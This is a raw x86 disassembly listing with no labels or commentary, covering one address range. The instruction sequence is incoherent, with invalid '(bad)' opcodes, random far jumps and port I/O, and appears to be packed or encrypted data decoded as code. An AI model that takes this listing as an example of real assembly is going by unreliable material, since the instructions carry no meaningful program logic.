  413c74:	jmp    0x4d25:0x8abb25e3
  413c7b:	add    eax,0xdb249d43
  413c80:	dec    esp
  413c81:	loop   0x413c55
  413c83:	xchg   DWORD PTR [ecx+0x2c405203],ebp
  413c89:	mov    cl,0xf
  413c8b:	xchg   edi,eax
  413c8c:	cmp    eax,0x62a313e7
  413c91:	rcl    BYTE PTR ss:[eax-0x77aa005c],1
  413c98:	lahf   
  413c99:	inc    eax
  413c9a:	xchg   edx,eax
  413c9b:	jp     0x413cb4
  413c9d:	xchg   BYTE PTR [esi+0x56ee30d],bl
  413ca3:	loopne 0x413cd3
  413ca5:	jl     0x413ce4
  413ca7:	gs adc eax,0x96db1716
  413cad:	jg     0x413c76
  413caf:	sbb    eax,0x6874fab3
  413cb4:	les    eax,FWORD PTR [ebx-0x557fdeec]
  413cba:	cmp    eax,DWORD PTR [eax+0x16]
  413cbd:	mov    bh,cl
  413cbf:	push   cs
  413cc0:	mov    ecx,0x2f3cb381
  413cc5:	pop    ebx
  413cc6:	adc    eax,0xd0406f20
  413ccb:	sub    bl,BYTE PTR ds:0xebab45ce
  413cd1:	mov    dh,0x2e
  413cd3:	dec    edi
  413cd4:	add    eax,0x91262649
  413cd9:	dec    esp
  413cda:	jb     0x413c78
  413cdc:	cmp    al,0xed
  413cde:	(bad)  
  413cdf:	imul   cl
  413ce1:	sbb    ch,dl
  413ce3:	arpl   WORD PTR [ebx-0x2175e807],bp
  413ce9:	and    BYTE PTR [ebp+0x4cd775de],ah
  413cef:	mov    WORD PTR [ebx],gs
  413cf1:	call   0x93ac414
  413cf6:	jge    0x413cb6
  413cf8:	call   0x514c:0x644e7647
  413cff:	and    DWORD PTR [ebp-0x424450cb],0xda4247c9
  413d09:	pop    edi
  413d0a:	jne    0x413c8f
  413d0c:	add    DWORD PTR [ebp-0x4c5c7650],edx
  413d12:	fdiv   QWORD PTR [esi]
  413d14:	jnp    0x413ca8
  413d16:	mov    DWORD PTR [ebp+0x4c204122],esi
  413d1c:	and    ebp,DWORD PTR [edx-0x80]
  413d1f:	lahf   
  413d20:	push   esp
  413d21:	aad    0x86
  413d23:	fdiv   QWORD PTR [ebp-0x6c]
  413d26:	jg     0x413cad
  413d28:	push   ebx
  413d29:	or     eax,0x2b32593f
  413d2e:	int3   
  413d2f:	sub    al,bh
  413d31:	add    DWORD PTR [ecx],ebp
  413d33:	fsubr  DWORD PTR [edx+0x72250acf]
  413d39:	ss or  eax,0x8446cf0b
  413d3f:	enter  0x2945,0xd
  413d43:	call   0xe5f3:0x56cafaca
  413d4a:	mov    ch,0x9d
  413d4c:	inc    ecx
  413d4d:	popf   
  413d4e:	sub    edx,DWORD PTR [edx-0x36]
  413d51:	adc    edi,DWORD PTR [edx]
  413d53:	dec    edx
  413d54:	shr    DWORD PTR [edi+eax*4],1
  413d57:	loop   0x413d2f
  413d59:	in     eax,0xb0
  413d5b:	mov    eax,0x78e7b635
  413d60:	cli    
  413d61:	mov    WORD PTR [ebx-0x64f251e7],fs
  413d67:	loopne 0x413cfc
  413d69:	mov    esp,0xd6637432
  413d6e:	jg     0x413d41
  413d70:	(bad)
  413d74:	mov    ebp,0xfe1afd6e
  413d79:	stos   DWORD PTR es:[edi],eax
  413d7a:	jns    0x413daa
  413d7c:	adc    ch,BYTE PTR [ecx-0x5f6c9525]
  413d82:	call   0x5979:0xa215ba18
  413d89:	div    BYTE PTR [ebp-0x1a645a5b]
  413d8f:	je     0x413dd2
  413d91:	jne    0x413df9
  413d93:	xchg   ebx,eax
  413d94:	rol    ecx,1
  413d96:	mov    ecx,0xc0ef573e
  413d9b:	jns    0x413db9
  413d9d:	dec    esp
  413d9e:	inc    edx
  413d9f:	xor    BYTE PTR [esi+0x51bebc84],al
  413da5:	ds fwait
  413da7:	jecxz  0x413da9
  413da9:	xor    al,0xad
  413dab:	sub    BYTE PTR [edx+0x1e],dl
  413dae:	adc    dh,al
  413db0:	push   ds
  413db1:	pop    ds
  413db2:	sbb    ecx,DWORD PTR [ebp-0x215e0283]
  413db8:	scas   al,BYTE PTR es:[edi]
  413db9:	xchg   ah,bh
  413dbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dbc:	icebp  
  413dbd:	xchg   DWORD PTR [ebp-0x16],edx
  413dc0:	mov    dl,0x97
  413dc2:	pop    edx
  413dc3:	inc    ecx
  413dc4:	pop    edi
  413dc5:	ror    esp,0x7c
  413dc8:	inc    esp
  413dc9:	pushf  
  413dca:	xchg   edx,eax
  413dcb:	dec    esp
  413dcc:	shr    DWORD PTR [edi+0x17],0x80
  413dd0:	cs push eax
  413dd2:	jns    0x413dea
  413dd4:	test   DWORD PTR [edx-0x734bab82],0xf9cfba9
  413dde:	jge    0x413e28
  413de0:	imul   ebx,DWORD PTR [esi+eax*1-0x6a],0xfffffff9
  413de5:	push   cs
  413de6:	jae    0x413e21
  413de8:	adc    eax,0x4444b0b5
  413ded:	push   ds
  413dee:	push   0x17523e0
  413df3:	fstp   QWORD PTR [esp+ecx*4]
  413df6:	ja     0x413da8
  413df8:	push   ebx
  413df9:	and    eax,0xeb9637de
  413dfe:	ror    DWORD PTR [edx-0x8bdf131],0xec
  413e05:	mov    dh,cl
  413e07:	and    BYTE PTR [edi],cl
  413e09:	fst    DWORD PTR [ecx+0x3a39e02]
  413e0f:	loopne 0x413e3a
  413e11:	cmp    eax,0xf726230d
  413e16:	add    BYTE PTR [ebp+0x1ee76bf2],bh
  413e1c:	pop    edi
  413e1d:	or     dh,dh
  413e1f:	adc    bl,BYTE PTR [esi-0x35]
  413e22:	sahf   
  413e23:	loope  0x413dc4
  413e25:	ret    
  413e26:	adc    al,BYTE PTR [ecx-0x7d]
  413e29:	pop    ds
  413e2a:	jmp    0x2ecf:0x9c844e21
  413e31:	sub    ah,BYTE PTR [edx-0x17920e70]
  413e37:	les    ebp,FWORD PTR [eax-0x62]
  413e3a:	(bad)  
  413e3b:	push   cs
  413e3c:	jmp    0xafbd:0x64092402
  413e43:	fsubr  st,st(6)
  413e45:	push   esp
  413e46:	dec    ecx
  413e47:	ret    0x806f
  413e4a:	sub    dh,BYTE PTR [ebx]
  413e4c:	adc    al,0xcb
  413e4e:	mov    ah,0xd
  413e50:	adc    DWORD PTR [eax+0x64],edi
  413e53:	out    dx,eax
  413e54:	outs   dx,DWORD PTR ds:[esi]
  413e55:	dec    ebx
  413e56:	xor    bh,0x25
  413e59:	dec    esi
  413e5a:	sub    al,0xaa
  413e5c:	mov    dh,0xbb
  413e5e:	xor    esi,DWORD PTR [ecx-0x75]
  413e61:	pop    es
  413e62:	and    eax,0x3a51482f
  413e67:	not    edx
  413e69:	mov    es,WORD PTR [edi-0x62029245]
  413e6f:	sub    DWORD PTR [ebx+edx*2-0x6d74ec86],edx
  413e76:	fcomp  QWORD PTR [ecx]
  413e78:	add    ebp,DWORD PTR [ebx+0x316053e7]
  413e7e:	lea    ebx,[edx+0x17]
  413e81:	push   0xa6e7cbe7
  413e86:	nop
  413e87:	pop    ss
  413e88:	sbb    al,0xb
  413e8a:	rcr    BYTE PTR [ecx+0xf7b9a2b],cl
  413e90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e91:	jp     0x413e68
  413e93:	hlt    
  413e94:	out    0x16,al
  413e96:	imul   DWORD PTR [ebx-0x689b39c3]
  413e9c:	mov    edi,0xd21f2422
  413ea1:	adc    edi,DWORD PTR [esi+0x27]
  413ea4:	and    BYTE PTR [edx+eiz*2-0x35],bh
  413ea8:	fstp   TBYTE PTR [edi+0x2b0326d3]
  413eae:	std    
  413eaf:	add    BYTE PTR [ebp+0x66],bh
  413eb2:	push   0xffffff9a
  413eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413eb5:	mov    bh,0xf8
  413eb7:	pop    ss
  413eb8:	inc    edx
  413eb9:	dec    eax
  413eba:	mov    ds:0xe50a1604,eax
  413ebf:	nop
  413ec0:	es iret 
  413ec2:	sub    edx,edi
  413ec4:	or     esp,edi
  413ec6:	mul    BYTE PTR [eax-0xb]
  413ec9:	dec    ebp
  413eca:	in     eax,0xf5
  413ecc:	jmp    0x413ee2
  413ece:	pushf  
  413ecf:	sub    eax,0xbdd42a5a
  413ed4:	es scas al,BYTE PTR es:[edi]
  413ed6:	inc    ebp
  413ed7:	xor    al,0xd1
  413ed9:	or     eax,0x6597288f
  413ede:	gs push es
  413ee0:	das    
  413ee1:	lea    esi,[esi]
  413ee3:	lods   eax,DWORD PTR ss:[esi]
  413ee5:	es out 0xfd,al
  413ee8:	test   eax,0x4ceb823f
  413eed:	mov    ds:0xd76ae18e,eax
  413ef2:	fwait
  413ef3:	or     ebp,eax
  413ef5:	cmp    edx,DWORD PTR [eax]
  413ef7:	mov    ah,0x6c
  413ef9:	or     ecx,DWORD PTR [ebp-0x5e34b406]
  413eff:	std    
  413f00:	add    eax,0x90ec2a23
  413f05:	pop    eax
  413f06:	in     eax,0x80
  413f08:	popf   
  413f09:	stc    
  413f0a:	pop    ds
  413f0b:	lods   eax,DWORD PTR ds:[esi]
  413f0c:	aaa    
  413f0d:	(bad)  
  413f0e:	mov    ecx,0x32eb7ce3
  413f13:	addr16 loopne 0x413f48
  413f16:	arpl   WORD PTR [edi-0x16],si
  413f19:	scas   eax,DWORD PTR es:[edi]
  413f1a:	mov    bl,0xd5
	...
  4140f4:	push   ebx
  4140f5:	inc    edx
  4140f6:	or     DWORD PTR [ecx+ebx*1-0x2a100801],edi
  4140fd:	pop    eax
  4140fe:	cdq    
  4140ff:	ror    DWORD PTR [edx+ebp*8],0x59
  414103:	cmp    BYTE PTR ds:0x1e000153,dl
  414109:	pop    es
  41410a:	add    BYTE PTR [eax],al
  41410c:	sub    BYTE PTR [edx+0x12ed89a5],bh
  414112:	retf   0xdc24
  414115:	les    edi,FWORD PTR [eax]
  414117:	outs   dx,DWORD PTR ds:[esi]
  414118:	int    0x98
  41411a:	idiv   DWORD PTR [ecx]
  41411c:	popf   
  41411d:	sub    edx,DWORD PTR [ebx+0x3607f806]
  414123:	xchg   esp,eax
  414124:	and    dl,BYTE PTR [edi-0x1c6ded0d]
  41412a:	mov    ah,0xb0
  41412c:	in     eax,0x79
  41412e:	sub    ebp,ebp
  414130:	or     al,0x3e
  414132:	xchg   edx,eax
  414133:	jmp    0xa53c:0xf86efebd
  41413a:	into   
  41413b:	rol    BYTE PTR [ebx],cl
  41413d:	adc    BYTE PTR [edi-0x3a618313],al
  414143:	mov    ebx,0x8871cce0
  414149:	and    BYTE PTR [ebx+0x4f],ah
  41414c:	xchg   eax,edi
  41414e:	mov    esp,0x95ed36af
  414153:	lock mov al,ds:0xd1d5dc9a
  414159:	sub    BYTE PTR [edi+ecx*8-0x3c],al
  41415d:	xor    BYTE PTR [esi+0x7],0x48
  414161:	lods   eax,DWORD PTR ds:[esi]
  414162:	lock adc DWORD PTR [edi+0x309f7f1b],ebp
  414169:	add    BYTE PTR [esi-0x46],dl
  41416c:	lea    edi,[edx-0x733f502]
  414172:	aam    0x57
  414174:	xor    al,0x28
  414176:	add    DWORD PTR [eax+edx*1+0x7b],esi
  41417a:	xor    al,0xe9
  41417c:	lods   al,BYTE PTR ds:[esi]
  41417d:	mov    bl,0x36
  41417f:	mov    eax,0x2b50dd8b
  414184:	sbb    al,0xa0
  414186:	pop    edx
  414187:	pop    esi
  414188:	xor    BYTE PTR [eax],dl
  41418a:	int    0x1c
  41418c:	inc    edi
  41418d:	or     eax,edi
  41418f:	and    BYTE PTR [ebp-0x316c9b2d],al
  414195:	in     eax,dx
  414196:	imul   esi,esi,0x8f825438
  41419c:	test   BYTE PTR gs:[ebx-0x71473233],0x61
  4141a4:	call   0xfd9e81a9
  4141a9:	in     al,dx
  4141aa:	jge    0x41417f
  4141ac:	lods   eax,DWORD PTR ds:[esi]
  4141ad:	ja     0x41416a
  4141af:	icebp  
  4141b0:	dec    edx
  4141b1:	in     al,dx
  4141b2:	adc    ah,bh
  4141b4:	clc    
  4141b5:	xchg   edx,eax
  4141b6:	jns    0x4141b1
  4141b8:	cmc    
  4141b9:	or     DWORD PTR [ebx+0x17b14c],edi
  4141bf:	cmp    DWORD PTR [ebx],0xffffffeb
  4141c2:	test   BYTE PTR [edi+0x1b],bh
  4141c5:	xchg   esp,eax
  4141c6:	pop    ss
  4141c7:	nop
  4141c8:	ret    0x6502
  4141cb:	mov    dh,0x5c
  4141cd:	and    ebx,DWORD PTR [eax]
  4141cf:	adc    BYTE PTR [edi+0x52],0xb4
  4141d3:	aas    
  4141d4:	clc    
  4141d5:	shl    BYTE PTR [ecx+0x4f],cl
  4141d8:	adc    al,0xd4
  4141da:	popa   
  4141db:	call   0xec56:0xf0faecef
  4141e2:	ss aad 0x38
  4141e5:	arpl   WORD PTR [edi],bx
  4141e7:	dec    ecx
  4141e8:	sbb    DWORD PTR [edx],eax
  4141ea:	cli    
  4141eb:	adc    BYTE PTR ds:0xcea6d56f,0xe7
  4141f2:	(bad)  
  4141f3:	es ins DWORD PTR es:[edi],dx
  4141f5:	mov    edi,0xa35e534c
  4141fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141fb:	sahf   
  4141fc:	scas   al,BYTE PTR es:[edi]
  4141fd:	clc    
  4141fe:	pop    esi
  4141ff:	leave  
  414200:	dec    ebx
  414201:	enter  0x3fa,0xa9
  414205:	sbb    eax,0x513d0aa4
  41420a:	push   ebx
  41420b:	outs   dx,BYTE PTR ds:[esi]
  41420c:	into   
  41420d:	mov    dh,0x84
  41420f:	push   esi
  414210:	xchg   ecx,eax
  414211:	call   0x31790951
  414216:	jle    0x414257
  414218:	push   0xdd112ad3
  41421d:	nop
  41421e:	jp     0x414277
  414220:	aam    0x79
  414222:	dec    ebp
  414223:	jle    0x414216
  414225:	fsub   st,st(7)
  414227:	cmp    ebx,DWORD PTR [ebp+0x4404fd4c]
  41422d:	and    dl,BYTE PTR [ecx]
  41422f:	xchg   edx,eax
  414230:	xor    dh,BYTE PTR [ebx]
  414232:	xchg   ecx,eax
  414233:	stc    
  414234:	in     al,dx
  414235:	mov    cs,WORD PTR [ebp+0x2]
  414238:	xor    eax,0xc2888de3
  41423d:	shr    DWORD PTR [edx],0x22
  414240:	sbb    eax,0xf682ef6d
  414245:	call   0xddb61d01
  41424a:	jnp    0x414216
  41424c:	lahf   
  41424d:	cmp    DWORD PTR [edi],edx
  41424f:	stos   DWORD PTR es:[edi],eax
  414250:	jle    0x4141f8
  414252:	xchg   ebx,eax
  414253:	push   ds
  414254:	imul   ecx,DWORD PTR [esi+0x56c381a6],0xe759d174
  41425e:	mov    ah,0x2b
  414260:	pop    ecx
  414261:	ror    BYTE PTR [ebp+ebx*4+0x31],cl
  414265:	inc    edx
  414266:	mov    edx,?
  414268:	inc    eax
  414269:	adc    BYTE PTR [ecx],cl
  41426b:	sbb    ebp,ebp
  41426d:	jb     0x4141fb
  41426f:	or     al,0x2c
  414271:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414272:	popf   
  414273:	ja     0x414216
  414275:	xor    BYTE PTR [ebx],dh
  414277:	ins    DWORD PTR es:[edi],dx
  414278:	aad    0x88
  41427a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41427b:	pop    eax
  41427c:	in     al,dx
  41427d:	in     eax,0xad
  41427f:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  414281:	push   eax
  414282:	sbb    eax,0x3b1a5cae
  414287:	pushw  es
  414289:	sub    DWORD PTR [eax-0x40],ebx
  41428c:	fs retf 
  41428e:	jmp    0x25f8:0xa7bd274d
  414295:	jo     0x414237
  414297:	in     eax,dx
  414298:	sbb    ecx,DWORD PTR ds:0xd5b15ea9
  41429e:	cld    
  41429f:	out    0xd9,al
  4142a1:	mov    al,0x2
  4142a3:	lahf   
  4142a4:	clc    
  4142a5:	push   edx
  4142a6:	pop    esp
  4142a7:	test   eax,0x384d901
  4142ac:	mov    bl,0x31
  4142ae:	loop   0x4142fa
  4142b0:	adc    al,0xd7
  4142b2:	retf   0xb32c
  4142b5:	(bad)  
  4142b6:	mov    esi,edx
  4142b8:	lods   eax,DWORD PTR ds:[esi]
  4142b9:	stos   DWORD PTR es:[edi],eax
  4142ba:	xor    BYTE PTR [ebp-0xf],bh
  4142bd:	out    dx,al
  4142be:	mov    edx,0x3eadb909
  4142c3:	outs   dx,BYTE PTR ds:[esi]
  4142c4:	pop    esp
  4142c5:	les    edx,FWORD PTR [eax]
  4142c7:	(bad)  
  4142c9:	sub    ebx,DWORD PTR [esp+edx*2-0x78]
  4142cd:	mov    al,0x38
  4142cf:	or     DWORD PTR [ecx+0x6b],eax
  4142d2:	mov    eax,0x922735ab
  4142d7:	push   edx
  4142d8:	sub    al,0x87
  4142da:	nop
  4142db:	or     cl,BYTE PTR [ecx]
  4142dd:	adc    ebx,DWORD PTR [esi-0x49]
  4142e0:	nop
  4142e1:	les    edi,FWORD PTR [ebp-0x2c]
  4142e4:	jne    0x41432d
  4142e6:	xor    al,0xac
  4142e8:	adc    DWORD PTR [esi],edi
  4142ea:	shl    BYTE PTR [ebx+0x16],cl
  4142ed:	push   eax
  4142ee:	ins    BYTE PTR es:[edi],dx
  4142ef:	retf   0xe2a2
  4142f2:	stos   DWORD PTR es:[edi],eax
  4142f3:	fwait
  4142f4:	jbe    0x41431c
  4142f6:	cwde   
  4142f7:	cmp    eax,0x9e54b486
  4142fc:	ss dec ebx
  4142fe:	(bad)  
  4142ff:	or     edi,DWORD PTR [edx+0x4c]
  414302:	stos   DWORD PTR es:[edi],eax
  414303:	cmp    eax,0xe6e24978
  414308:	outs   dx,DWORD PTR ds:[esi]
  414309:	jo     0x4142a5
  41430b:	push   ebx
  41430c:	(bad)  
  41430e:	add    dh,BYTE PTR [ebx+0x61]
  414311:	das    
  414312:	sbb    ah,bh
  414314:	cmp    DWORD PTR [eax+0x23],ebp
  414317:	mov    bl,0xde
  414319:	ret    0xd689
  41431c:	push   edx
  41431d:	pop    ss
  41431e:	call   0xb945:0x2f1de983
  414325:	sbb    DWORD PTR [esi+0x6f664d1c],esp
  41432b:	fstp   TBYTE PTR [eax-0x3da3dbdd]
  414331:	mov    ah,0x8
  414333:	lea    esi,[eax]
  414335:	inc    eax
  414336:	push   ebx
  414337:	inc    ecx
  414338:	sahf   
  414339:	pop    edi
  41433a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41433b:	pop    ecx
  41433c:	or     BYTE PTR [esi+0x6a],0x25
  414340:	pop    ss
  414341:	sub    ebx,ebp
  414343:	aad    0xbe
  414345:	jb     0x414349
  414347:	int3   
  414348:	sti    
  414349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41434a:	aad    0x20
  41434c:	cmp    edx,DWORD PTR [edi]
  41434e:	iret   
  41434f:	outs   dx,DWORD PTR ds:[esi]
  414350:	xor    ch,BYTE PTR [esp+edi*2]
  414353:	les    edx,FWORD PTR [edi+0x142c4d11]
  414359:	mov    bh,0xf1
  41435b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41435c:	outs   dx,BYTE PTR ds:[esi]
  41435d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41435e:	fcmovnbe st,st(2)
  414360:	add    dh,BYTE PTR [ecx]
  414362:	push   cs
  414363:	sar    DWORD PTR [edi-0x9],cl
  414366:	inc    eax
  414367:	cmp    BYTE PTR [eax],al
  414369:	jno    0x4143a7
  41436b:	aam    0xda
  41436d:	mov    al,ds:0xfaebafd4
  414372:	sbb    BYTE PTR [ebx-0x38a37d33],0x49
  414379:	iret   
  41437a:	ror    ebp,0x45
  41437d:	inc    edx
  41437e:	push   ebx
  41437f:	sub    DWORD PTR [esi],esi
  414381:	rcr    eax,0x1c
  414384:	dec    ebp
  414385:	sbb    DWORD PTR [eax+edx*1+0x15],esp
  414389:	inc    ebx
  41438a:	inc    eax
  41438b:	imul   DWORD PTR ds:0x4942ad0c
  414391:	fidiv  DWORD PTR [ebp-0x33ad65fd]
  414397:	cmp    edi,DWORD PTR [ebx+0x3e982376]
  41439d:	or     dh,BYTE PTR [ebp+0x47]
  4143a0:	inc    esp
  4143a1:	cmc    
  4143a2:	pop    ss
  4143a3:	adc    eax,0xd876eed0
  4143a8:	daa    
  4143a9:	(bad)  
  4143aa:	and    BYTE PTR ds:0x9bf3fd14,cl
  4143b0:	les    ecx,FWORD PTR [esi-0x323a19c1]
  4143b6:	or     al,0xd5
  4143b8:	mov    ds:0xabdf69a7,eax
  4143bd:	fisttp QWORD PTR [edx+0x54]
  4143c0:	sbb    eax,0x694d6be6
  4143c5:	pop    eax
  4143c6:	int    0x5a
  4143c8:	fcom   st(3)
  4143ca:	or     DWORD PTR ds:0xc5d7b8bc,edx
  4143d0:	test   BYTE PTR [esi+0x24],ah
  4143d3:	arpl   WORD PTR [edi+0x75],si
  4143d6:	cmp    esi,esp
  4143d8:	loop   0x4143f6
  4143da:	ss out dx,al
  4143dc:	sub    al,0xa6
  4143de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143df:	xor    al,al
  4143e1:	jne    0x4143ac
  4143e3:	jns    0x4143c1
  4143e5:	ds (bad) 
  4143e7:	push   esi
  4143e8:	inc    BYTE PTR [esi]
  4143ea:	xor    ecx,DWORD PTR [edx+0x50]
  4143ed:	dec    ebp
  4143ee:	aad    0xc0
  4143f0:	xchg   edi,eax
  4143f1:	push   cs
  4143f2:	dec    eax
  4143f3:	jbe    0x41445f
  4143f5:	jecxz  0x414407
  4143f7:	mov    bh,ch
  4143f9:	xor    BYTE PTR [eax],cl
  4143fb:	test   DWORD PTR [eax-0x5a],ecx
  4143fe:	outs   dx,DWORD PTR ds:[esi]
  4143ff:	adc    BYTE PTR cs:[edi+0x7a],ch
  414403:	push   0xc1e50deb
  414408:	int    0xf0
  41440a:	ja     0x4143e6
  41440c:	fnstcw WORD PTR [edi+eax*2-0x57]
  414410:	and    ecx,ecx
  414412:	sbb    eax,esp
  414414:	adc    BYTE PTR [edi+0x22],dl
  414417:	out    0xe3,al
  414419:	cs xchg ebp,eax
  41441b:	shl    cl,1
  41441d:	pop    ecx
  41441e:	mov    edx,0xd181fb33
  414423:	lods   eax,DWORD PTR ds:[esi]
  414424:	les    esp,FWORD PTR [edx-0x48eeb11e]
  41442a:	mov    dh,0xb5
  41442c:	jne    0x4143d8
  41442e:	push   ebp
  41442f:	fsub   DWORD PTR [edx]
  414431:	shl    BYTE PTR [ecx-0x25],0xd2
  414435:	mov    eax,0xa1917f84
  41443a:	adc    BYTE PTR [edx-0x3c],0x34
  41443e:	sti    
  41443f:	jmp    0x81eb:0xca2b5dc9
  414446:	sar    DWORD PTR [ebx],0x9e
  414449:	xchg   DWORD PTR [esi+eax*1+0x30b41934],esi
  414450:	les    edi,FWORD PTR [edi]
  414452:	jne    0x4144a8
  414454:	popf   
  414455:	bound  ebx,QWORD PTR [ebx+eax*8]
  414458:	push   edi
  414459:	repnz fwait
  41445b:	push   0xffffffc6
  41445d:	iret   
  41445e:	mov    esi,0xe9e5d8a6
  414463:	xor    al,0xa0
  414465:	push   0xbc5a9dff
  41446a:	sbb    eax,0x323e2c7d
  41446f:	mov    ebx,0x92a06b26
  414474:	jmp    0xe9e56ed9
  414479:	add    eax,0x3a31a455
  41447e:	jmp    0x414463
  414480:	mov    ecx,gs
  414482:	mov    BYTE PTR ds:0x2bf6ca01,0xa7
  414489:	mov    ah,0xa
  41448b:	or     ecx,DWORD PTR [esi]
  41448d:	daa    
  41448e:	cmp    esp,ebp
  414490:	pop    DWORD PTR [eax]
  414492:	add    DWORD PTR [eax-0x7f38478],0x4c928836
  41449c:	jo     0x4144e0
  41449e:	xchg   edx,eax
  41449f:	lock jmp 0x45ec5ef2
  4144a5:	fsubr  st,st(6)
  4144a7:	push   ecx
  4144a8:	test   WORD PTR [edi],0x5ed6
  4144ad:	pop    esp
  4144ae:	mov    cl,0xcb
  4144b0:	cmp    DWORD PTR [ebx-0x69],ebp
  4144b3:	iret   
  4144b4:	sbb    eax,0x7bb666e9
  4144b9:	adc    al,0x18
  4144bb:	add    ebp,ebp
  4144bd:	or     eax,0x4cc6f1a4
  4144c2:	mov    esi,0x464265cd
  4144c7:	test   eax,0x9042184b
  4144cc:	dec    ebp
  4144cd:	jecxz  0x41445e
  4144cf:	cmp    eax,0xb80e84cd
  4144d4:	std    
  4144d5:	addr16 xchg esi,eax
  4144d7:	frstor [ecx-0x29]
  4144da:	cmp    BYTE PTR [ebp-0x3f],cl
  4144dd:	adc    cl,BYTE PTR ds:0x83fb6f8
  4144e3:	lods   eax,DWORD PTR ds:[esi]
  4144e4:	xchg   BYTE PTR [ebx+0x255ba230],al
  4144ea:	ins    BYTE PTR es:[edi],dx
  4144eb:	int    0xbe
  4144ed:	aad    0x5
  4144ef:	test   DWORD PTR [ebp*1-0x482e44c9],edi
  4144f6:	xor    eax,0xb3e334f0
  4144fb:	push   ecx
  4144fc:	add    DWORD PTR [eax+0x19],esp
  4144ff:	ss mov ah,bh
  414502:	inc    ecx
  414503:	inc    ebx
  414504:	mov    ecx,0xa09f1f18
  414509:	cmp    edx,DWORD PTR ds:0xc3aca494
  41450f:	jno    0x414590
  414511:	push   cs
  414512:	icebp  
  414513:	outs   dx,BYTE PTR ds:[esi]
  414514:	lds    ecx,FWORD PTR [ebp+0x45]
  414517:	in     al,0x82
  414519:	in     eax,dx
  41451a:	push   esi
  41451b:	inc    esp
  41451c:	xchg   BYTE PTR [ebp+0x2e],bh
  41451f:	scas   al,BYTE PTR es:[edi]
  414520:	dec    esp
  414521:	push   es
  414522:	fcmovbe st,st(1)
  414524:	push   ss
  414525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414526:	xor    eax,0xf56405cf
  41452b:	ror    DWORD PTR [edx+0x25d32af8],0x7
  414532:	cmp    eax,0x3749b52b
  414537:	(bad)  
  414538:	ja     0x414577
  41453a:	mov    eax,ds:0x35611ac0
  41453f:	(bad)  
  414541:	pop    ecx
  414542:	push   es
  414543:	xor    al,0xe1
  414545:	push   ebp
  414546:	pop    es
  414547:	inc    ecx
  414548:	lods   al,BYTE PTR ds:[esi]
  414549:	je     0x41453b
  41454b:	jo     0x414513
  41454d:	pop    edi
  41454e:	jo     0x4145c4
  414550:	dec    edi
  414551:	into   
  414552:	(bad)  
  414553:	out    dx,eax
  414554:	cli    
  414555:	sbb    edx,DWORD PTR [esi]
  414557:	out    0x5b,al
  414559:	popf   
  41455a:	sub    al,0x57
  41455c:	lahf   
  41455d:	leave  
  41455e:	pop    ecx
  41455f:	shr    BYTE PTR [eax],cl
  414561:	in     al,dx
  414562:	aaa    
  414563:	push   ebp
  414564:	ss popa 
  414566:	push   ebp
  414567:	push   edi
  414568:	pushf  
  414569:	ficomp WORD PTR [ebp+eiz*4-0x6c]
  41456d:	sub    eax,0xd1f4b468
  414572:	jbe    0x414529
  414574:	mov    DWORD PTR [edx+0x6fc4ef6f],ecx
  41457a:	xor    edx,DWORD PTR [eax+0x39]
  41457d:	xor    eax,0x26f35a37
  414582:	add    eax,0x7f07255a
  414587:	fxtract 
  414589:	cmp    esp,0x5c
  41458c:	adc    ebp,esi
  41458e:	xor    al,0xe3
  414590:	sbb    BYTE PTR [edx+0x71],bh
  414593:	call   0x530fbe4b
  414598:	fdiv   DWORD PTR [ecx+edi*8-0x2d]
  41459c:	xchg   esp,eax
  41459d:	cli    
  41459e:	jnp    0x414520
  4145a0:	jge    0x414534
  4145a2:	and    BYTE PTR [ebx],ch
  4145a4:	fsub   QWORD PTR [edx+0x6e]
  4145a7:	cld    
  4145a8:	jb     0x414589
  4145aa:	jge    0x414535
  4145ac:	add    DWORD PTR [ecx+ebp*4],0x2d1cf1d5
  4145b3:	xchg   ebx,eax
  4145b4:	cwde   
  4145b5:	sub    DWORD PTR [ebx],0xffffff80
  4145b8:	fld    TBYTE PTR [edi+0x40]
  4145bb:	mov    bl,0xcf
  4145bd:	lock jbe 0x414632
  4145c0:	xchg   esp,eax
  4145c1:	in     al,0x8c
  4145c3:	xor    dl,BYTE PTR [ebx+ecx*1+0x73]
  4145c7:	ror    DWORD PTR [ebx],1
  4145c9:	jmp    0x49b3:0xb53d632
  4145d0:	mov    ebx,DWORD PTR [eax]
  4145d2:	int3   
  4145d3:	mov    esi,0x1a420ed5
  4145d8:	or     al,0xb1
  4145da:	ret    
  4145db:	xor    edi,DWORD PTR [edi]
  4145dd:	fwait
  4145de:	jmp    0x4201f7fd
  4145e3:	mov    dl,BYTE PTR [esi+edi*2]
  4145e6:	sar    DWORD PTR [ebx-0x5d76d16b],cl
  4145ec:	xchg   ebp,eax
  4145ee:	cmp    DWORD PTR [edi+0x4c],ebx
  4145f1:	aaa    
  4145f2:	mov    DWORD PTR [eax],edi
  4145f4:	sub    al,0x8b
  4145f6:	mov    al,ds:0x1d14d571
  4145fb:	jae    0x4145d0
  4145fd:	xchg   ecx,eax
  4145fe:	call   0xc978:0x268f03d8
  414605:	int    0x25
  414607:	mov    esp,edi
  414609:	aas    
  41460a:	sbb    eax,0xd76ea56
  41460f:	push   esp
  414610:	xchg   ebx,eax
  414611:	xchg   edx,eax
  414612:	les    ebx,FWORD PTR es:[ebp-0x5d]
  414616:	mov    al,ds:0xc1830834
  41461b:	mov    cl,0x7c
  41461d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41461f:	jnp    0x414604
  414621:	cmp    al,0x4e
  414623:	mov    esp,0x399191a2
  414628:	into   
  414629:	sub    BYTE PTR [ebp+0x542a1736],bh
  41462f:	cdq    
  414630:	dec    ebx
  414631:	inc    eax
  414632:	loopne 0x41467d
  414634:	jnp    0x4145d3
  414636:	sub    eax,0x2013476c
